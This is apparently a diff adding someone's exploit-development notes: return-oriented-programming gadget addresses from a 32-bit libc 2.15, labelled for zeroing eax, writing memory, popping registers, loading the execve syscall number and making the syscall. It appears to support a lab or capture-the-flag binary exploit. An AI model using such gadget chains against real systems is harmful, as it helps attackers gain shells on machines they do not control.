@@ -1,0 +1,42 @@
+b7e20000-b7fc4000 r-xp 00000000 08:01 1049485    /lib/i386-linux-gnu/libc-2.15.so
+0x0804a010 - 0x0804a018 is .data
+0xb7e20174 - 0xb7e20198 is .note.gnu.build-id in /lib/i386-linux-gnu/libc.so.6
+
+
+to zero out eax-
+0x7e59fL: xor eax eax ; ret ;;
+add = b7e9e59f
+
+
+to store string at a address-
+0x2f28aL: mov [ecx+0x54] edx ;;
+0x6ba58L: mov [edx+0x14] ecx ;;
+0x2dfe2L: mov [edx+0x18] eax ;;
+0xea8f9L: mov [edx+0x4] eax ;; add= b7f0a8f9
+
+
+to pop into reg-
+0xfda81L: pop edx ; pop ecx ; pop ebx ;; add=b7f1da81
+
+to write zeros-
+first zero out eax and then use following
+0x741caL: mov [ecx] eax ;;
+0x2dfe2L: mov [edx+0x18] eax ;;
+0xea8f9L: mov [edx+0x4] eax ;;
+
+simple poping-
+0x1931eL: pop ebx ;;
+0x2404fL: pop eax ;; add=b7e4404f
+0x1a9eL: pop edx ;; add=b7e21a9e
+
+put syscall no. in eax-
+0x1493e6L: add eax 0xb ;; add=b7f693e6
+
+syscall-
+0xb9c25L: call dword [gs:0x10] ;; add=b7ed9c25
+
+
+
+
+
+
